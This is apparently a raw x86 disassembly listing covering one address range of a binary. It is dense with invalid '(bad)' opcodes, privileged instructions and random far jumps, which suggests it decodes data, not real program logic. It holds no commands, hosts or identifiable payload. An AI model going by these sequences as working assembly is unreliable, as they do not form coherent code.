  41da22:	cmp    DWORD PTR es:[ebx+0x49ec3de1],ebp
  41da29:	xchg   edx,eax
  41da2a:	popa   
  41da2b:	push   0xdbedde6a
  41da30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da31:	mov    bl,0x1a
  41da33:	push   edx
  41da34:	dec    eax
  41da35:	fnstcw WORD PTR [edx-0x6e4ecfad]
  41da3b:	leave  
  41da3c:	mov    ss,WORD PTR [edi-0x7192faec]
  41da42:	ins    DWORD PTR es:[edi],dx
  41da43:	std    
  41da44:	je     0x41da3a
  41da46:	lds    edx,FWORD PTR [esi-0x3aa8f36d]
  41da4c:	jne    0x41d9df
  41da4e:	xchg   esp,eax
  41da4f:	mov    ch,0xa1
  41da51:	pop    ss
  41da52:	fwait
  41da53:	(bad)  
  41da54:	and    esp,DWORD PTR [ebp-0x9]
  41da57:	xchg   ebp,eax
  41da58:	push   esp
  41da59:	pop    ebp
  41da5a:	pop    eax
  41da5b:	aas    
  41da5c:	or     bh,BYTE PTR [ebx-0x42e3b8c1]
  41da62:	add    ch,cl
  41da64:	add    BYTE PTR [edx-0x42fa730c],dh
  41da6a:	lea    esp,[edi-0x6da93fc1]
  41da70:	int3   
  41da71:	pop    esi
  41da72:	cli    
  41da73:	jns    0x41dabd
  41da75:	(bad)  
  41da76:	repnz aam 0x29
  41da79:	mov    ah,BYTE PTR [edi-0x752cf575]
  41da7f:	arpl   WORD PTR [edx+esi*2],sp
  41da82:	jae    0x41dad5
  41da84:	les    ebp,FWORD PTR [edx-0x3aa830f1]
  41da8a:	ret    0xc3e
  41da8d:	fist   WORD PTR ds:0x16ec6230
  41da93:	test   al,0x65
  41da95:	add    eax,0x45bfcbd2
  41da9a:	inc    eax
  41da9b:	je     0x41da7c
  41da9d:	push   esi
  41da9e:	ins    DWORD PTR es:[edi],dx
  41da9f:	cmp    al,0x16
  41daa1:	je     0x41da33
  41daa3:	ds dec edi
  41daa5:	test   al,0xaa
  41daa7:	or     eax,0xdc2533cd
  41daac:	mov    ds:0x2cd6e9c0,eax
  41dab1:	call   0xa784dcc8
  41dab6:	arpl   WORD PTR [ebx-0x7d18f6a2],di
  41dabc:	push   cs
  41dabd:	or     esi,DWORD PTR [edx]
  41dabf:	jmp    0x5eec:0xa057ad46
  41dac6:	mov    dh,0x53
  41dac8:	lds    ebp,FWORD PTR [ecx-0x74]
  41dacb:	mov    edi,DWORD PTR [ebx-0x52]
  41dace:	scas   al,BYTE PTR es:[edi]
  41dacf:	jbe    0x41daa7
  41dad1:	lods   al,BYTE PTR ds:[esi]
  41dad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dad3:	test   DWORD PTR [esi],0xea06a0fb
  41dad9:	push   es
  41dada:	pop    ebx
  41dadb:	xchg   esp,eax
  41dadc:	neg    BYTE PTR [esp+ebx*1-0x52]
  41dae0:	mov    ch,0x88
  41dae2:	or     DWORD PTR [ecx+0x5ef65a30],ebx
  41dae8:	div    BYTE PTR [edi+esi*8-0x27]
  41daec:	or     al,0x2d
  41daee:	mov    edi,0xd175fa1b
  41daf3:	pop    ebx
  41daf4:	push   0x28498a65
  41daf9:	pop    edi
  41dafa:	jae    0x41db53
  41dafc:	push   cs
  41dafd:	dec    esi
  41dafe:	loope  0x41dabb
  41db00:	inc    ebp
  41db01:	pop    ebp
  41db02:	push   edi
  41db03:	mov    ebp,0x5177e7ca
  41db08:	stos   BYTE PTR es:[edi],al
  41db09:	mov    BYTE PTR [eax+0x12],dl
  41db0c:	jb     0x41dac6
  41db0e:	(bad)  
  41db0f:	jmp    0xb3529973
  41db14:	and    DWORD PTR [esi+edi*2+0x3],esi
  41db18:	call   DWORD PTR es:[edx+0x205ff1f1]
  41db1f:	sti    
  41db20:	adc    al,0xe9
  41db22:	(bad)  
  41db23:	cmp    esi,esi
  41db25:	adc    al,0x96
  41db27:	jp     0x41daf9
  41db29:	mov    eax,ds:0xa4ed5e6e
  41db2e:	cmp    BYTE PTR ds:0x3a825dfc,ch
  41db34:	in     eax,0x4a
  41db36:	cmp    DWORD PTR [ebp-0x57],ecx
  41db39:	out    0x1a,eax
  41db3b:	mov    al,ds:0x32ba0885
  41db40:	cmp    al,0x59
  41db42:	mov    ah,0x9d
  41db44:	or     ch,BYTE PTR [ecx]
  41db46:	inc    esi
  41db47:	jmp    0x1d3156cf
  41db4c:	inc    ebp
  41db4d:	inc    esp
  41db4e:	imul   esp,DWORD PTR ds:0x6c6bbfba,0x5a2bb16e
  41db58:	js     0x41db6b
  41db5a:	je     0x41dbd7
  41db5c:	add    bl,bh
  41db5e:	es je  0x41db6c
  41db61:	daa    
  41db62:	push   0xffffffb5
  41db64:	arpl   WORD PTR [edx+0x3c],dx
  41db67:	scas   eax,DWORD PTR es:[edi]
  41db68:	xchg   BYTE PTR [esi+0x4],al
  41db6b:	icebp  
  41db6c:	leave  
  41db6d:	mov    al,0xd
  41db6f:	loop   0x41db05
  41db71:	inc    edx
  41db72:	shl    ebx,0x65
  41db75:	jl     0x41db82
  41db77:	jns    0x41dbf0
  41db79:	jmp    0x6628:0x102534d0
  41db80:	lods   al,BYTE PTR ds:[esi]
  41db81:	out    0x67,al
  41db83:	pop    esi
  41db84:	in     al,0x1c
  41db86:	sahf   
  41db87:	cmc    
  41db88:	lods   al,BYTE PTR ds:[esi]
  41db89:	xor    ebp,esi
  41db8b:	iret   
  41db8c:	out    dx,eax
  41db8d:	stos   BYTE PTR es:[edi],al
  41db8e:	mov    gs,ebx
  41db90:	inc    esi
  41db91:	pop    edi
  41db92:	daa    
  41db93:	xchg   ebx,eax
  41db94:	adc    eax,0x50e86bbe
  41db99:	add    esi,DWORD PTR [ebp-0x5bb32f87]
  41db9f:	push   0xb8becd87
  41dba4:	mov    esp,0x2f612de6
  41dba9:	add    al,0x3b
  41dbab:	add    DWORD PTR [esi],esp
  41dbad:	push   es
  41dbae:	rcr    bl,1
  41dbb0:	mov    ds:0xa94b17dc,al
  41dbb5:	stos   BYTE PTR es:[edi],al
  41dbb6:	dec    eax
  41dbb7:	xor    eax,0x15053928
  41dbbc:	mov    esi,0x4c965784
  41dbc1:	mov    al,ds:0xf0a8a604
  41dbc6:	lods   al,BYTE PTR ds:[esi]
  41dbc7:	cwd    
  41dbc9:	or     edx,DWORD PTR es:[ebx]
  41dbcc:	cld    
  41dbcd:	or     DWORD PTR [edi],eax
  41dbcf:	mov    ecx,0x724d8746
  41dbd4:	cmp    BYTE PTR [ecx],bl
  41dbd6:	push   edi
  41dbd7:	cmp    DWORD PTR [eax+0x62],esi
  41dbda:	push   ecx
  41dbdb:	jge    0x41dc28
  41dbdd:	and    dl,dl
  41dbdf:	xor    ch,BYTE PTR [edx+0x66]
  41dbe2:	pop    esi
  41dbe3:	in     al,dx
  41dbe4:	mov    ebx,0x33a8aea2
  41dbe9:	out    dx,eax
  41dbea:	inc    eax
  41dbeb:	(bad)  
  41dbec:	sub    bh,BYTE PTR [edi+eax*8]
  41dbef:	inc    esi
  41dbf0:	mov    edx,0xd7ba2474
  41dbf5:	push   0xffffff80
  41dbf7:	dec    eax
  41dbf8:	lea    ebx,[edi-0x1d]
  41dbfb:	and    al,0x25
  41dbfd:	mov    bl,0x5d
  41dbff:	pusha  
  41dc00:	mov    BYTE PTR [edi-0x60956657],al
  41dc06:	hlt    
  41dc07:	lds    eax,FWORD PTR [ecx]
  41dc09:	pop    esi
  41dc0a:	stos   BYTE PTR es:[edi],al
  41dc0b:	fnstcw WORD PTR [ecx+0x50]
  41dc0e:	and    eax,0xbfa3ac9
  41dc13:	int3   
  41dc14:	cdq    
  41dc15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc16:	and    edx,esi
  41dc18:	(bad)  [ecx+ebp*8+0x63ea82e0]
  41dc1f:	mov    ebx,0xef547d0c
  41dc24:	sti    
  41dc25:	jecxz  0x41dbcb
  41dc27:	sahf   
  41dc28:	jmp    0x11e8:0x2fedbd96
  41dc2f:	sbb    eax,0x4922e5f8
  41dc34:	mov    ah,0xa8
  41dc36:	ins    DWORD PTR es:[edi],dx
  41dc37:	lock mov fs,WORD PTR [edi+ebp*2]
  41dc3b:	add    al,0xa6
  41dc3d:	inc    eax
  41dc3e:	sar    esp,0x4b
  41dc41:	ins    BYTE PTR es:[edi],dx
  41dc42:	dec    edi
  41dc43:	sub    BYTE PTR ds:0xa090f62a,ah
  41dc49:	sti    
  41dc4a:	call   0xdbfd:0xedecc3aa
  41dc51:	push   edx
  41dc52:	fnstenv [ecx]
  41dc54:	and    DWORD PTR [ebx],edi
  41dc56:	jge    0x41dc2d
  41dc58:	pop    es
  41dc59:	rcr    BYTE PTR [edx+0x48],1
  41dc5c:	jno    0x41dcd2
  41dc5e:	or     BYTE PTR [edx+edx*8],0x72
  41dc62:	xchg   ecx,eax
  41dc63:	mov    cl,BYTE PTR [edi-0x1b]
  41dc66:	loopne 0x41dca2
  41dc68:	outs   dx,DWORD PTR ds:[esi]
  41dc69:	cmp    esi,DWORD PTR [esp+ebx*8-0x3d]
  41dc6d:	pop    ebp
  41dc6e:	sti    
  41dc6f:	pop    edx
  41dc70:	xchg   esp,eax
  41dc71:	mov    WORD PTR [ebp-0x45b39008],es
  41dc77:	add    dl,BYTE PTR fs:[ebp+0x27e0466a]
  41dc7e:	lea    esi,[ecx-0x3ce46043]
  41dc84:	mov    DWORD PTR [eax-0x4ba3e265],ebx
  41dc8a:	adc    BYTE PTR [ecx-0x563f967d],bh
  41dc90:	jns    0x41dc29
  41dc92:	lods   al,BYTE PTR ds:[esi]
  41dc93:	jl     0x41dcff
	...
  41dd11:	add    BYTE PTR [eax],al
  41dd13:	add    BYTE PTR [ecx+0x6a],ah
  41dd16:	jmp    0xffd9c832
  41dd1b:	jle    0x41dd23
  41dd1d:	js     0x41dccc
  41dd1f:	aam    0x17
  41dd21:	jno    0x41dd4b
  41dd23:	mov    bh,0x4e
  41dd25:	js     0x41dd28
  41dd27:	add    BYTE PTR [ecx+0x7],ch
  41dd2a:	add    BYTE PTR [eax],al
  41dd2c:	add    al,0x4
  41dd2e:	sub    DWORD PTR [esi-0x104b723e],0x871cd62
  41dd38:	imul   ebx,DWORD PTR [esi+0x16],0xffffffa4
  41dd3c:	int3   
  41dd3d:	fwait
  41dd3e:	sub    eax,0x7f36f8d7
  41dd43:	js     0x41dd3a
  41dd45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd46:	sbb    eax,0x2dd5bb03
  41dd4b:	sbb    BYTE PTR [ebx-0x1cde49b1],cl
  41dd51:	sub    al,0x16
  41dd53:	retf   0x955f
  41dd56:	xchg   ebx,eax
  41dd57:	dec    esp
  41dd58:	or     ecx,edi
  41dd5a:	ret    
  41dd5b:	je     0x41dd62
  41dd5d:	push   edx
  41dd5e:	mov    cl,0x11
  41dd60:	jae    0x41dd26
  41dd62:	ficom  WORD PTR [edx+eax*1-0x78]
  41dd66:	push   esp
  41dd67:	add    al,BYTE PTR [esp+edx*2-0x7c24850b]
  41dd6e:	dec    ecx
  41dd6f:	loope  0x41dd19
  41dd71:	push   0x5e
  41dd73:	pop    edx
  41dd74:	add    ebx,DWORD PTR [ecx+0x59923b12]
  41dd7a:	sub    eax,0xfb37028b
  41dd7f:	or     BYTE PTR [ebx],dl
  41dd81:	adc    ebx,DWORD PTR [esi-0x6f18fe92]
  41dd87:	repz lds eax,FWORD PTR [edi]
  41dd8a:	or     bh,BYTE PTR [esi-0x80]
  41dd8d:	dec    edx
  41dd8e:	mov    edx,0xa9b1d01f
  41dd93:	loopne 0x41dd79
  41dd95:	test   BYTE PTR [ebp+eiz*1-0x27],dh
  41dd99:	jb     0x41dddc
  41dd9b:	enter  0x92be,0x82
  41dd9f:	push   es
  41dda0:	jae    0x41dd5d
  41dda2:	jne    0x41de16
  41dda4:	jg     0x41de19
  41dda6:	outs   dx,DWORD PTR ds:[esi]
  41dda7:	xor    al,0x5f
  41dda9:	std    
  41ddaa:	stc    
  41ddab:	stos   BYTE PTR es:[edi],al
  41ddac:	in     al,0x29
  41ddae:	jo     0x41dd7b
  41ddb0:	jno    0x41dd52
  41ddb2:	(bad)  
  41ddb4:	ss ins DWORD PTR es:[edi],dx
  41ddb6:	fcomp  QWORD PTR [edi-0x67de8ca3]
  41ddbc:	lahf   
  41ddbd:	inc    edx
  41ddbe:	mov    dh,0xac
  41ddc0:	inc    esi
  41ddc1:	cwde   
  41ddc2:	out    0x8e,eax
  41ddc4:	popf   
  41ddc5:	mov    fs,WORD PTR fs:[edi+0x4b0ae95b]
  41ddcc:	popa   
  41ddcd:	xchg   esi,eax
  41ddce:	add    ebx,edi
  41ddd0:	mov    bl,0x10
  41ddd2:	daa    
  41ddd3:	fld    QWORD PTR [esi+0x78]
  41ddd6:	add    DWORD PTR [edx-0x771ddf55],edi
  41dddc:	test   BYTE PTR [edi+0x6e],dl
  41dddf:	jge    0x41dd93
  41dde1:	gs leave 
  41dde3:	jmp    0xce48:0x977caca
  41ddea:	imul   eax,eax,0xffffffa1
  41dded:	mov    eax,ds:0x7f9a0d33
  41ddf2:	(bad)  
  41ddf3:	leave  
  41ddf4:	mov    ebx,0x9bfca34d
  41ddf9:	bound  esi,QWORD PTR [ebx-0x553d8a90]
  41ddff:	jmp    0x1c99:0xb8afcb72
  41de06:	call   0x85959e0
  41de0b:	lds    ecx,FWORD PTR [esi-0x3530d8a8]
  41de11:	or     al,0xbb
  41de13:	arpl   WORD PTR [ecx+0x6d],bp
  41de16:	sbb    eax,0x60c09b43
  41de1b:	std    
  41de1c:	int3   
  41de1d:	xchg   ecx,eax
  41de1e:	jno    0x41ddb0
  41de20:	jb     0x41dda9
  41de22:	sub    dh,ch
  41de24:	push   0x9361053e
  41de29:	arpl   ax,si
  41de2b:	sahf   
  41de2c:	test   DWORD PTR [eax],ecx
  41de2e:	daa    
  41de2f:	and    al,0x54
  41de31:	cmp    BYTE PTR [esi+0x54],0x98
  41de35:	mov    ah,0x65
  41de37:	cmp    edx,DWORD PTR [ebx-0x16f8bc85]
  41de3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de3e:	je     0x41ddca
  41de40:	shr    DWORD PTR [edx+0x5b3e8d19],0x59
  41de47:	adc    dl,BYTE PTR [edi+0x35]
  41de4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de4b:	rol    BYTE PTR [ecx+0x3f8348fd],cl
  41de51:	mov    BYTE PTR [ebx+0x3a],0xa8
  41de55:	pop    es
  41de56:	(bad)  
  41de57:	sub    eax,0x915c78af
  41de5c:	das    
  41de5d:	fs inc edi
  41de5f:	fiadd  WORD PTR fs:0x59c273a1
  41de66:	sbb    al,BYTE PTR [edi+0x3b6ba08d]
  41de6c:	ret    
  41de6d:	adc    esp,DWORD PTR [esi]
  41de6f:	(bad)  
  41de70:	addr16 xchg ecx,eax
  41de72:	xchg   edx,eax
  41de73:	inc    esp
  41de74:	fisub  WORD PTR [ecx-0x8]
  41de77:	call   0x7824:0x31cb5278
  41de7e:	dec    esp
  41de7f:	das    
  41de80:	repz stc 
  41de82:	inc    edi
  41de83:	mov    eax,ds:0x3a32b6af
  41de88:	in     al,dx
  41de89:	mov    fs,WORD PTR [esi-0x73]
  41de8c:	jg     0x41de24
  41de8e:	jle    0x41ded9
  41de90:	jmp    0x41de15
  41de92:	xor    al,0xbc
  41de94:	cmp    eax,0x74d04932
  41de99:	xor    DWORD PTR [ebx],ebp
  41de9b:	push   ebp
  41de9c:	std    
  41de9d:	sbb    BYTE PTR [ebp-0x4158c82a],dh
  41dea3:	pop    edx
  41dea4:	inc    ebp
  41dea5:	lahf   
  41dea6:	arpl   bx,ax
  41dea8:	pop    ecx
  41dea9:	mov    al,ds:0xb53d8082
  41deae:	cwde   
  41deaf:	leave  
  41deb0:	xor    esi,DWORD PTR [edx]
  41deb2:	add    al,0x44
  41deb4:	daa    
  41deb5:	jg     0x41de3a
  41deb7:	cmc    
  41deb8:	rol    BYTE PTR [edx+0x418356e3],cl
  41debe:	jbe    0x41dee6
  41dec0:	sbb    eax,0xbcce4a36
  41dec5:	and    DWORD PTR [eax],ebp
  41dec7:	mov    ds:0x6af1a43f,al
  41decc:	or     al,0xb
  41dece:	inc    edx
  41decf:	push   edx
  41ded0:	push   edx
  41ded1:	adc    al,0x15
  41ded3:	push   ebx
  41ded4:	inc    ecx
  41ded5:	xchg   esi,eax
  41ded6:	loopne 0x41df4e
  41ded8:	div    BYTE PTR [ecx-0x4a]
  41dedb:	jns    0x41df11
  41dedd:	retf   0xbc69
  41dee0:	retf   
  41dee1:	and    al,0xa4
  41dee3:	ss ror dl,1
  41dee6:	rcr    DWORD PTR [ecx+0x7b],0x9d
  41deea:	sbb    al,0x53
  41deec:	jl     0x41df55
  41deee:	mov    eax,ds:0xb27b8d01
  41def3:	jle    0x41df4f
  41def5:	xor    esi,edx
  41def7:	pop    edi
  41def8:	add    ch,dh
  41defa:	dec    ebx
  41defb:	test   dh,bl
  41defd:	mov    bh,BYTE PTR [ebx+0xffd7c8d]
  41df03:	jno    0x41df6b
  41df05:	push   0xffffffb9
  41df07:	push   esp
  41df08:	idiv   edx
  41df0a:	xchg   esi,eax
  41df0b:	stos   BYTE PTR es:[edi],al
  41df0c:	mov    ebp,0x868acdab
  41df11:	add    dl,ch
  41df13:	je     0x41df39
  41df15:	mov    cl,0x20
  41df17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df18:	aas    
  41df19:	cld    
  41df1a:	enter  0xf29b,0x9f
  41df1e:	mov    ch,0x44
  41df20:	outs   dx,BYTE PTR ds:[esi]
  41df21:	jbe    0x41df1a
  41df23:	stos   DWORD PTR es:[edi],eax
  41df24:	stc    
  41df25:	sahf   
  41df26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df27:	pop    eax
  41df28:	or     BYTE PTR ds:0xdf281909,dh
  41df2e:	jnp    0x41defd
  41df30:	in     al,0xbf
  41df32:	push   esi
  41df33:	xor    eax,0xb3f1742d
  41df38:	nop
  41df39:	bound  esi,QWORD PTR [eax]
  41df3b:	jmp    0x41df80
  41df3d:	and    BYTE PTR [ebx],dl
  41df3f:	pushf  
  41df40:	das    
  41df41:	das    
  41df42:	dec    eax
  41df43:	inc    edi
  41df44:	dec    edi
  41df45:	mov    cr3,ecx
  41df48:	aaa    
  41df49:	es pop es
  41df4b:	iret   
  41df4c:	add    al,0x5d
  41df4e:	out    dx,al
  41df4f:	sbb    DWORD PTR [ebx-0x36],esi
  41df52:	push   ecx
  41df53:	or     ebx,DWORD PTR [edi+0x71]
  41df56:	out    dx,eax
  41df57:	sub    dl,BYTE PTR [eax-0x62]
  41df5a:	pop    edi
  41df5b:	sbb    ebp,DWORD PTR [ecx+0x3a]
  41df5e:	scas   al,BYTE PTR es:[edi]
  41df5f:	jnp    0x41df12
  41df61:	push   ss
  41df62:	fsubr  DWORD PTR [ebx]
  41df64:	xchg   esp,eax
  41df65:	jb     0x41dfb8
  41df67:	mov    bl,0x82
  41df69:	ins    DWORD PTR es:[edi],dx
  41df6a:	adc    eax,0x4490a988
  41df6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df70:	push   cs
  41df71:	pusha  
  41df72:	mov    al,0xa0
  41df74:	or     ecx,DWORD PTR [ebx+0x3d]
  41df77:	or     ebx,DWORD PTR [edi]
  41df79:	jmp    0x41df21
  41df7b:	ror    BYTE PTR [edi],1
  41df7d:	pushf  
  41df7e:	jmp    0xb71ce177
  41df83:	retf   
  41df84:	push   0xffffffbc
  41df86:	xchg   esi,eax
  41df87:	xchg   esp,eax
  41df88:	jle    0x41dfbd
  41df8a:	seto   dh
  41df8d:	lds    eax,FWORD PTR [edx]
  41df8f:	fdiv   QWORD PTR ds:0x7a2baae1
  41df95:	mov    ecx,0xff584a15
  41df9a:	xchg   ebp,eax
  41df9b:	add    eax,0xe61c3441
  41dfa0:	dec    esp
  41dfa1:	jmp    0x3fc5:0x83e485df
  41dfa8:	int3   
  41dfa9:	sub    al,0x60
  41dfab:	jns    0x41df7b
  41dfad:	jb     0x41df3d
  41dfaf:	pop    esp
  41dfb0:	sbb    DWORD PTR [eax+0x3b525868],ecx
  41dfb6:	ins    BYTE PTR es:[edi],dx
  41dfb7:	ret    
  41dfb8:	jns    0x41e020
  41dfba:	rol    ebp,1
  41dfbc:	out    0x9c,eax
  41dfbe:	xchg   esi,eax
  41dfbf:	sbb    DWORD PTR [ebx],ebx
  41dfc1:	sbb    edx,eax
  41dfc3:	mov    ah,0x42
  41dfc5:	ins    BYTE PTR es:[edi],dx
  41dfc6:	std    
  41dfc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfc8:	sub    edx,DWORD PTR [esi-0x51]
  41dfcb:	ja     0x41e040
  41dfcd:	repz jle 0x41df93
  41dfd0:	xor    eax,0xb312255
  41dfd5:	mov    ch,0x54
  41dfd7:	adc    ebp,DWORD PTR [ecx+0x1833e96e]
  41dfdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfde:	in     eax,0xae
  41dfe0:	retf   
  41dfe1:	hlt    
  41dfe2:	dec    ebp
  41dfe3:	lock jno 0x41dfdd
  41dfe6:	ror    DWORD PTR gs:[edi],0xd7
  41dfea:	pop    ebx
  41dfeb:	sub    BYTE PTR [esi+edi*2+0x322aaa7],dh
  41dff2:	and    dl,BYTE PTR [eax]
  41dff4:	div    DWORD PTR [ebx]
  41dff6:	mov    esp,0xec54e8f2
  41dffb:	xchg   ecx,eax
  41dffc:	sar    BYTE PTR [esi+ebx*4],cl
  41dfff:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e001:	xor    eax,0x671c9b13
  41e006:	out    0x80,eax
  41e008:	aaa    
  41e009:	add    ch,BYTE PTR [ebp+0x2bbd60c5]
  41e00f:	dec    ecx
  41e010:	mov    ds:0xf519eb1b,eax
  41e015:	jno    0x41dfa9
  41e017:	aad    0x37
  41e019:	scas   al,BYTE PTR es:[edi]
  41e01a:	or     ebx,esp
  41e01c:	sbb    cl,BYTE PTR [ecx-0x7d]
  41e01f:	loop   0x41e07f
  41e021:	test   al,0x4c
  41e023:	int3   
  41e024:	ja     0x41dfeb
  41e026:	outs   dx,BYTE PTR ds:[esi]
  41e027:	mov    BYTE PTR [ebp+0xd],cl
  41e02a:	cmc    
  41e02b:	clc    
  41e02c:	das    
  41e02d:	mov    al,ds:0xaec9892
  41e032:	rol    DWORD PTR [eax-0x459304d6],1
  41e038:	dec    ebx
  41e039:	push   ss
  41e03a:	shl    DWORD PTR [edx-0x11],0x7
  41e03e:	ins    BYTE PTR es:[edi],dx
  41e03f:	(bad)  
  41e040:	repz add eax,DWORD PTR [ebp-0x68481983]
  41e047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e048:	pop    esp
  41e049:	mov    eax,0x19f8d79f
  41e04e:	mov    esi,0x10819c0d
  41e053:	xor    DWORD PTR gs:[esi+0x21],eax
  41e057:	xor    eax,0x48ffdf3e
  41e05c:	and    ebp,esi
  41e05e:	xlat   BYTE PTR ds:[ebx]
  41e05f:	sub    ebp,ebx
  41e061:	jg     0x41e0a9
  41e063:	add    al,0xfd
  41e065:	add    DWORD PTR [edx-0x7d],edi
  41e068:	sub    DWORD PTR [esi-0x1cfa1524],ebx
  41e06e:	clc    
  41e06f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e070:	jne    0x41e038
  41e072:	jbe    0x41e071
  41e074:	sbb    eax,0xcbbe5009
  41e079:	or     al,0x58
  41e07b:	jmp    0x41e0c0
  41e07d:	sbb    edx,DWORD PTR [ecx+0x5c8adf2d]
  41e083:	inc    ecx
  41e084:	aas    
  41e085:	mov    al,0x42
  41e087:	pop    ecx
  41e088:	push   0xffffffb7
  41e08a:	mov    bl,0xb2
  41e08c:	xor    al,0x8b
  41e08e:	call   0x95849941
  41e093:	pop    ss
  41e094:	and    bh,ah
  41e096:	xchg   ebp,eax
  41e097:	adc    al,0x5a
  41e099:	bound  esp,QWORD PTR [ebp-0x23d7979a]
  41e09f:	mov    dh,0x27
  41e0a1:	mov    dl,0x88
  41e0a3:	xor    al,0x7
  41e0a5:	shl    DWORD PTR ds:0x40265c85,cl
  41e0ab:	mul    BYTE PTR [ebx-0xe63db18]
  41e0b1:	mov    cl,0xc
  41e0b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0b4:	dec    esi
  41e0b5:	dec    ebp
  41e0b6:	lods   al,BYTE PTR ds:[esi]
  41e0b7:	pop    ebp
  41e0b8:	inc    esp
  41e0b9:	gs jnp 0x41e0cc
  41e0bc:	push   ebx
  41e0bd:	loop   0x41e051
  41e0bf:	adc    eax,esi
  41e0c1:	sbb    eax,DWORD PTR [eax+ecx*1-0x1c9dbf4d]
  41e0c8:	cmp    dl,0x60
  41e0cb:	mov    ecx,0x71364b5e
  41e0d0:	sar    BYTE PTR [eax],cl
  41e0d2:	pop    ebp
  41e0d3:	mov    edi,es
  41e0d5:	xchg   ebx,eax
  41e0d6:	icebp  
  41e0d7:	sbb    BYTE PTR [eax+0x12837043],cl
  41e0dd:	mov    dh,0xb1
  41e0df:	lods   eax,DWORD PTR ds:[esi]
  41e0e0:	pop    ebp
  41e0e1:	adc    al,0x9d
  41e0e3:	sub    eax,0x82402862
  41e0e8:	fnstcw WORD PTR [edi+0x754c2b0f]
  41e0ee:	cs dec edx
  41e0f0:	(bad)  
  41e0f1:	popf   
  41e0f2:	jle    0x41e12a
  41e0f4:	or     bh,BYTE PTR [eax+edi*4-0x40714310]
  41e0fb:	and    ebx,DWORD PTR [ecx+eiz*1]
  41e0fe:	outs   dx,BYTE PTR ds:[esi]
  41e0ff:	sub    al,0x2c
  41e101:	sub    BYTE PTR [edi],al
  41e103:	pop    es
  41e104:	push   ecx
  41e105:	cld    
  41e106:	into   
  41e107:	mov    edi,0x6fc37392
  41e10c:	loope  0x41e170
  41e10e:	cld    
  41e10f:	test   DWORD PTR [esp+esi*4+0x51],eax
  41e113:	imul   DWORD PTR [eax-0x37]
  41e116:	xor    DWORD PTR [ecx],0xe3d26455
  41e11c:	arpl   WORD PTR [esi],cx
  41e11e:	test   esp,eax
  41e120:	fldcw  WORD PTR [ecx-0x705c75a8]
  41e126:	enter  0x348d,0xe6
  41e12a:	mov    ah,0x8a
  41e12c:	xor    eax,0x68f75387
  41e131:	xor    BYTE PTR [edi-0x4f],ch
  41e134:	mov    gs,WORD PTR [ecx]
  41e136:	pusha  
  41e137:	cmp    esi,esi
  41e139:	sub    al,ch
  41e13b:	or     al,0x1b
  41e13d:	add    al,0x4c
  41e13f:	pop    eax
  41e140:	mov    ds:0x1d423623,al
  41e145:	cmp    al,0x48
  41e147:	dec    esp
  41e148:	jnp    0x41e176
  41e14a:	adc    BYTE PTR [edx-0x1],ah
  41e14d:	dec    esi
  41e14e:	in     al,dx
  41e14f:	push   0x3
  41e151:	dec    ecx
  41e152:	cdq    
  41e153:	cli    
  41e154:	push   ebx
  41e155:	(bad)  
  41e156:	jle    0x41e180
  41e158:	add    BYTE PTR [ebx+ecx*1],dh
  41e15b:	add    eax,DWORD PTR [esi+0x4]
  41e15e:	icebp  
  41e15f:	sbb    al,0x43
  41e161:	push   esp
  41e162:	lods   al,BYTE PTR ds:[esi]
  41e163:	mov    ebx,DWORD PTR [edi-0x7b865c82]
  41e169:	mov    dh,0x4a
  41e16b:	add    DWORD PTR [ebp+0x741663e7],esi
  41e171:	xchg   ebx,eax
  41e172:	(bad)  
  41e174:	lahf   
  41e175:	mov    ds:0x932a3c21,al
  41e17a:	imul   edx,esp,0x2da6b6b1
  41e180:	mov    al,bh
  41e182:	fst    DWORD PTR [ebx+0x17de154a]
  41e188:	mov    cl,cl
  41e18a:	push   ebx
  41e18b:	push   ebp
  41e18c:	adc    eax,0xee5fb2fa
  41e191:	fdivr  QWORD PTR [edi-0x60caf02b]
  41e197:	xchg   edx,eax
  41e198:	icebp  
  41e199:	sub    eax,DWORD PTR [ebp+0x2e]
  41e19c:	idiv   DWORD PTR [edi+0x4bcc3ea0]
  41e1a2:	inc    edi
  41e1a3:	fidivr WORD PTR [edi+0x10]
  41e1a6:	ds loop 0x41e168
  41e1a9:	mov    esp,0x639f8c21
  41e1ae:	jbe    0x41e1d8
  41e1b0:	cmovo  edi,ecx
  41e1b3:	(bad)  
  41e1b4:	cwde   
  41e1b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1b6:	and    eax,0x25ed2aef
  41e1bb:	cmp    esp,eax
  41e1bd:	mov    edi,esi
  41e1bf:	loope  0x41e194
  41e1c1:	push   ds
  41e1c2:	adc    DWORD PTR [edx+0x35f615b],esp
  41e1c8:	inc    ebp
  41e1c9:	mov    ebp,0xf0b2f68d
  41e1ce:	mov    ecx,0xd762c8b7
  41e1d3:	cli    
  41e1d4:	push   DWORD PTR [eax-0x452b6952]
  41e1da:	sbb    BYTE PTR [ecx],bh
  41e1dc:	je     0x41e1d3
  41e1de:	cs pushf 
  41e1e0:	ret    
  41e1e1:	ror    bh,0x4b
  41e1e4:	and    BYTE PTR [eax+0x711f02ea],dl
  41e1ea:	mov    ds:0xdd870fdc,eax
  41e1ef:	and    cl,BYTE PTR [ebx]
  41e1f1:	xchg   DWORD PTR [eax],ecx
  41e1f3:	adc    al,0xaa
  41e1f5:	in     eax,0x9b
  41e1f7:	cld    
  41e1f8:	adc    DWORD PTR [edi+0x40c8949],ebp
  41e1fe:	je     0x41e18c
  41e200:	mov    ch,0x1a
  41e202:	mov    fs,WORD PTR [ebx+0x91c8130]
  41e208:	xchg   edi,eax
  41e209:	ins    BYTE PTR es:[edi],dx
